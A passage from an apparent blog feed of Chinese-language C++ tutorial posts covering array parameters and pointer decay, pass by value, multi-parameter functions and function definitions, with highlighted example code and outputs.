class="comment">// 或者 int* arr</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function: Modifying array elements...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        arr[i] *= <span class="number">2</span>; <span class="comment">// 直接修改原始数组的元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> my_array[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> array_size = <span class="keyword">sizeof</span>(my_array) / <span class="keyword">sizeof</span>(my_array[<span class="number">0</span>]); <span class="comment">// 计算数组大小</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling function: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array_size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; my_array[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，传递数组名 (即地址) 和大小</span></span><br><span class="line">    double_elements(my_array, array_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling function: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array_size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; my_array[i] &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 数组内容已被修改</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before calling function: 1 2 3 4 5</span><br><span class="line">Inside function: Modifying array elements...</span><br><span class="line">After calling function: 2 4 6 8 10</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> <code>main</code> 函数定义了一个数组 <code>my_array</code>。</li><li> 调用 <code>double_elements(my_array, array_size)</code> 时，<code>my_array</code> (代表数组首元素的地址) 被传递给函数的 <code>arr</code> 参数，<code>array_size</code> 被传递给 <code>size</code> 参数。</li><li> 函数内部通过指针 <code>arr</code> 访问并修改了 <code>main</code> 函数中定义的 <code>my_array</code> 的元素。</li><li> 函数返回后，<code>main</code> 函数中的 <code>my_array</code> 的内容确实发生了改变。</li></ol><h2 id="7-3-2-将数组作为参数意味着什么"><a href="#7-3-2-将数组作为参数意味着什么" class="headerlink" title="7.3.2 将数组作为参数意味着什么"></a>7.3.2 将数组作为参数意味着什么</h2><p>将数组名传递给函数时，会发生所谓的“数组退化”（Array Decay）。数组名会“退化”成指向其第一个元素的指针。这就是为什么函数参数 <code>int arr[]</code> 和 <code>int* arr</code> 是等价的。</p><p><strong>Implications:</strong></p><ol><li> <strong>效率:</strong> 不需要复制整个数组，传递地址非常快，尤其是对于大数组。</li><li> <strong>修改能力:</strong> 函数可以直接修改调用者提供的原始数组。这既是优点（允许函数“返回”修改后的数组）也是缺点（可能意外修改数据）。</li><li> <strong>丢失大小信息:</strong> 函数本身无法知道数组的大小。必须显式传递大小信息。</li></ol><h2 id="7-3-3-更多数组函数示例"><a href="#7-3-3-更多数组函数示例" class="headerlink" title="7.3.3 更多数组函数示例"></a>7.3.3 更多数组函数示例</h2><p><strong>示例 1: 计算数组元素总和</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：计算数组元素的总和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// 使用 const 防止意外修改</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        total += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(data) / <span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> sum = sum_array(data, size);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of array elements: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 2: 查找数组中的最大值</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // 为了使用 INT_MIN</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：查找数组中的最大值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_max</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* arr, <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// 使用指针表示法和 const</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Array size must be positive.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">int</span>&gt;::min(); <span class="comment">// 返回可能的最小值作为错误指示</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_val = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; max_val) &#123;</span><br><span class="line">            max_val = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> scores[] = &#123;<span class="number">88</span>, <span class="number">95</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">91</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="keyword">sizeof</span>(scores) / <span class="keyword">sizeof</span>(scores[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> highest_score = find_max(scores, count);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Highest score: &quot;</span> &lt;&lt; highest_score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-3-4-使用数组区间的函数"><a href="#7-3-4-使用数组区间的函数" class="headerlink" title="7.3.4 使用数组区间的函数"></a>7.3.4 使用数组区间的函数</h2><p>除了传递数组首地址和大小之外，另一种常见且更灵活的方法是传递指向数组<strong>开始</strong>和<strong>结束之后</strong>位置的指针（或迭代器，STL 中常用）。这定义了一个处理范围 <code>[begin, end)</code>（包含 begin，不包含 end）。</p><p><strong>示例：使用指针区间求和</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：计算从 begin 到 end (不含 end) 的元素和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_range</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* begin, <span class="keyword">const</span> <span class="keyword">int</span>* end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环直到当前指针达到 end 指针</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">int</span>* ptr = begin; ptr != end; ++ptr) &#123;</span><br><span class="line">        total += *ptr; <span class="comment">// 解引用指针获取元素值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(data) / <span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算整个数组的和</span></span><br><span class="line">    <span class="keyword">int</span> total_sum = sum_range(data, data + size); <span class="comment">// data + size 指向数组末尾之后的位置</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total sum: &quot;</span> &lt;&lt; total_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 55</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算数组一部分的和 (例如，索引 2 到 6，即元素 3, 4, 5, 6, 7)</span></span><br><span class="line">    <span class="keyword">int</span> partial_sum = sum_range(data + <span class="number">2</span>, data + <span class="number">7</span>); <span class="comment">// data+2 指向第3个元素, data+7 指向第8个元素 (区间终点)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Partial sum (index 2 to 6): &quot;</span> &lt;&lt; partial_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 25</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法在 C++ 标准库算法中非常常用。</p><h2 id="7-3-5-指针和-const"><a href="#7-3-5-指针和-const" class="headerlink" title="7.3.5 指针和 const"></a>7.3.5 指针和 const</h2><p>如前面的示例所示，如果函数不应该修改传入的数组，应该在函数参数中使用 <code>const</code> 关键字。这是一种重要的编程实践，可以提高代码的安全性和清晰度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数承诺不会修改 arr 指向的数组内容</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Array elements: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="comment">// arr[i] = 0; // 错误！编译器会阻止修改 const 数据</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>const</code> 有两个主要好处：</p><ol><li> <strong>防止意外修改:</strong> 编译器会检查并阻止函数内部对 <code>const</code> 参数的修改尝试。</li><li> <strong>表明意图:</strong> 向函数的调用者表明该函数不会改变传入的数组，使得函数接口更清晰。</li><li> <strong>接受更广泛的参数:</strong> <code>const</code> 参数的函数可以接受 <code>const</code> 数组和非 <code>const</code> 数组作为实参，而非 <code>const</code> 参数的函数只能接受非 <code>const</code> 数组。</li></ol><p>总结来说，将数组传递给函数是通过传递指向其首元素的指针来实现的。这使得函数能够访问和（如果未使用 <code>const</code>）修改原始数组，但也要求调用者通常需要额外传递数组的大小或使用指针区间来界定操作范围。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.2 函数参数和按值传递</title>
      <link href="2025/04/26/7.2_%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E5%92%8C%E6%8C%89%E5%80%BC%E4%BC%A0%E9%80%92/"/>
      <url>2025/04/26/7.2_%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E5%92%8C%E6%8C%89%E5%80%BC%E4%BC%A0%E9%80%92/</url>
      
        <content type="html"><![CDATA[<p>函数参数是函数与调用它的代码之间传递信息的桥梁。当调用函数时，我们提供的值（实参）会被传递给函数定义中声明的变量（形参）。C++ 默认的参数传递方式是**按值传递 (Pass by Value)**。</p><p><strong>形参 (Parameters):</strong> 在函数定义或函数原型中声明的变量，它们是函数内部使用的局部变量，用于接收调用时传入的值。</p><p><strong>实参 (Arguments):</strong> 在函数调用时传递给函数的具体值或变量。</p><p><strong>按值传递 (Pass by Value):</strong></p><p>当使用按值传递时，函数会创建每个形参的<strong>副本</strong>。调用函数时提供的实参的值会被复制到这些新的形参变量中。函数内部对形参所做的任何修改都只影响这个副本，<strong>不会</strong>影响到函数调用中使用的原始实参。</p><p><strong>示例：演示按值传递</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：接受一个 int 参数 (形参 n)</span></span><br><span class="line"><span class="comment">// 按值传递，n 是 value 的副本</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_value</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (before modification): n = &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    n = n * <span class="number">2</span>; <span class="comment">// 修改形参 n 的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (after modification): n = &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>; <span class="comment">// 实参</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling function: value = &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，将 value 的值传递给形参 n</span></span><br><span class="line">    modify_value(value);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling function: value = &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// value 的值并未改变</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before calling function: value &#x3D; 10</span><br><span class="line">Inside function (before modification): n &#x3D; 10</span><br><span class="line">Inside function (after modification): n &#x3D; 20</span><br><span class="line">After calling function: value &#x3D; 10</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> <code>main</code> 函数中的变量 <code>value</code> 初始化为 10。</li><li> 调用 <code>modify_value(value)</code> 时，<code>value</code> 的值 (10) 被<strong>复制</strong>给了 <code>modify_value</code> 函数的形参 <code>n</code>。</li><li> 在 <code>modify_value</code> 函数内部，<code>n</code> 的值被修改为 20。但这仅仅修改了 <code>n</code> 这个<strong>局部副本</strong>。</li><li> 当函数执行完毕返回 <code>main</code> 后，<code>main</code> 函数中的原始变量 <code>value</code> 仍然是 10，没有受到函数内部修改的影响。</li></ol><p><strong>优点:</strong></p><ul><li>  <strong>安全性:</strong> 保护了原始数据不被函数意外修改。</li></ul><p><strong>缺点:</strong></p><ul><li>  <strong>效率:</strong> 对于大型数据结构（如复杂的类对象或结构体），复制整个对象可能消耗较多的时间和内存。在这种情况下，后续章节将介绍的按引用传递或按指针传递可能更高效。</li></ul><h2 id="7-2-1-多个参数"><a href="#7-2-1-多个参数" class="headerlink" title="7.2.1 多个参数"></a>7.2.1 多个参数</h2><p>函数可以接受任意数量的参数。在函数定义和原型中，参数之间用逗号 <code>,</code> 分隔。调用函数时，提供的实参也必须用逗号分隔，并且数量、类型和顺序应与形参列表匹配。</p><p><strong>示例：接受多个参数的函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接受两个 double 和一个 char</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">(<span class="keyword">double</span> length, <span class="keyword">double</span> width, <span class="keyword">char</span> unit)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; length &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Width: &quot;</span> &lt;&lt; width &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; length * width &lt;&lt; <span class="string">&quot; sq &quot;</span> &lt;&lt; unit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> len = <span class="number">5.5</span>;</span><br><span class="line">    <span class="keyword">double</span> wid = <span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">char</span> symbol = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，传递三个实参</span></span><br><span class="line">    display_data(len, wid, symbol);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Length: 5.5 m</span><br><span class="line">Width: 2 m</span><br><span class="line">Area: 11 sq m</span><br></pre></td></tr></table></figure><h2 id="7-2-2-另外一个接受两个参数的函数"><a href="#7-2-2-另外一个接受两个参数的函数" class="headerlink" title="7.2.2 另外一个接受两个参数的函数"></a>7.2.2 另外一个接受两个参数的函数</h2><p>下面是另一个简单的例子，计算并返回两个整数中的较大值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：接受两个 int 参数，返回较大的那个 int</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 或者使用三元运算符: return (a &gt; b) ? a : b;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">28</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数，传递两个实参</span></span><br><span class="line">    <span class="keyword">int</span> larger_value = max(num1, num2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Between &quot;</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; num2</span><br><span class="line">              &lt;&lt; <span class="string">&quot;, the larger value is: &quot;</span> &lt;&lt; larger_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以直接在输出语句中调用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The max of 100 and 99 is: &quot;</span> &lt;&lt; max(<span class="number">100</span>, <span class="number">99</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子再次展示了如何定义和调用带有多个参数的函数，并且该函数还返回一个值。参数 <code>a</code> 和 <code>b</code> 也是按值传递的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.1 复习函数的基本知识</title>
      <link href="2025/04/26/7.1_%E5%A4%8D%E4%B9%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>2025/04/26/7.1_%E5%A4%8D%E4%B9%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>函数是 C++ 程序的基本构建块，它们允许我们将代码组织成可重用的、逻辑独立的单元。使用函数可以使程序更模块化、更易于理解和维护。本节将复习函数的基本概念：定义、原型和调用。</p><h2 id="7-1-1-定义函数"><a href="#7-1-1-定义函数" class="headerlink" title="7.1.1 定义函数"></a>7.1.1 定义函数</h2><p><strong>函数定义 (Function Definition)</strong> 包含了函数的实际代码，它说明了函数做什么以及如何做。一个函数定义包括以下几个部分：</p><ol><li> <strong>返回类型 (Return Type):</strong> 函数执行完毕后返回给调用者的值的类型。如果函数不返回任何值，则返回类型为 <code>void</code>。</li><li> <strong>函数名 (Function Name):</strong> 用于调用函数的标识符。命名规则与变量名相同。</li><li> <strong>参数列表 (Parameter List):</strong> 位于函数名后的圆括号 <code>()</code> 中，用于接收传递给函数的值。参数之间用逗号分隔，每个参数都需要指定类型和名称。如果函数不接受任何参数，括号内可以为空或写 <code>void</code>。</li><li> <strong>函数体 (Function Body):</strong> 位于花括号 <code>&#123;&#125;</code> 中，包含实现函数功能的 C++ 语句。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体：包含执行任务的语句</span></span><br><span class="line">    <span class="comment">// 如果 return_type 不是 void，则需要 return 语句返回值</span></span><br><span class="line">    <span class="keyword">return</span> value; <span class="comment">// (如果 return_type 不是 